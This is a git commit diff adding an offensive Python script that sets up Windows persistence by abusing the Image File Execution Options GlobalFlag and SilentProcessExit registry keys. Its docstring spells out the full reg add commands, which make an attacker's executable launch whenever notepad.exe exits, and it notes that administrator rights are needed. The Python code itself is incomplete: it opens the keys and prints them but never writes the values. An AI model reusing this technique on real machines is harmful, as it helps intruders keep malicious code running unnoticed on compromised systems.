2e5fe0d29375dbba0aa6ede426d958a7e7b61119
Alexis Rodriguez <rodriguez10011999@gmail.com>
2020-10-10 17:28:51 -0400

    updating PyPersistence folder

---
+++ PyPersistence/PersistenceViaGlobalFlag/persist_using_global_flag.py
@@ -0,0 +1,64 @@
+#!/usr/bin/env python3
+
+r"""
+The following registry edits will allows us establish persistence via GlobalFlags in image file execution options:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\pentestlab.exe"
+
+In order for the persistence mechanism to work, the attacker must have administrator rights
+"""
+
+from winreg import (
+  ConnectRegistry,
+  OpenKey,
+  SetValueEx,
+  EnumValue,
+  QueryInfoKey,
+  CreateKeyEx,
+  KEY_ALL_ACCESS,
+  KEY_WRITE,
+  REG_SZ,
+  REG_DWORD,
+  HKEY_LOCAL_MACHINE,
+)
+
+from ctypes import (
+  windll,
+  c_long,
+  byref
+)
+
+from sys import argv
+
+target_reg_keys = (
+  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
+  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit",
+  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"
+)
+
+def flush_registry_changes():
+  HWND_BROADCAST = 0xFFFF
+  WM_SETTINGCHANGE = 0x1A
+  SMTO_ABORTIFHUNG = 0x0002
+  result = c_long()
+  SendMessageTimeoutW = windll.user32.SendMessageTimeoutW
+  SendMessageTimeoutW (
+    HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+    u"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    SMTO_ABORTIFHUNG, 5000, byref(result)
+  )    
+
+def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
+  with ConnectRegistry(None, HKEY_LOCAL_MACHINE) as hklm:
+    # create the `SilentProcessExit` subkey with target executable
+    CreateKeyEx(hklm, target_reg_keys[1], 0, KEY_WRITE)
+    for reg_key in target_reg_keys:
+      with OpenKey(hklm, reg_key, 0, KEY_ALL_ACCESS) as target_key:
+        print(QueryInfoKey(target_key))        
+
+if __name__ == "__main__":
+  target_exe = argv[1]
+  malicious_exe_path = argv[2]
+  target_reg_keys = list(map(lambda key: key + "\\" + target_exe, target_reg_keys))
+  persist(malicious_exe_path, target_exe, target_reg_keys)
